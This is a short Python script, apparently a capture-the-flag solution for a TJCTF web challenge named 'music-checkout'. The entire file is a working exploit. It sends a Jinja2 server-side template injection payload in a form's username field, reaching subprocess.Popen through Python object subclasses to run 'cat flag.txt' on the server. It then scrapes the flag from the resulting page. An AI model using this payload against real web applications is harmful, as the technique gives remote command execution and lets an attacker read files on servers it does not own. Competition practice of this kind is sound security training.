import requests

URL = "https://music-checkout-39c9378873dedda0.tjc.tf"

r = requests.post(
    URL + "/create_playlist",
    data={
        "text": "",
        "username": "{{'abc'.__class__.__base__.__subclasses__()[336]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}",
    },
)
href_start = r.text.index('href="') + 6
href_end = r.text.index('"', href_start)
r2 = requests.get(URL + r.text[href_start:href_end])
flag_start = r2.text.index("tjctf{")
print(r2.text[flag_start : r2.text.index("}", flag_start + 1) + 1])
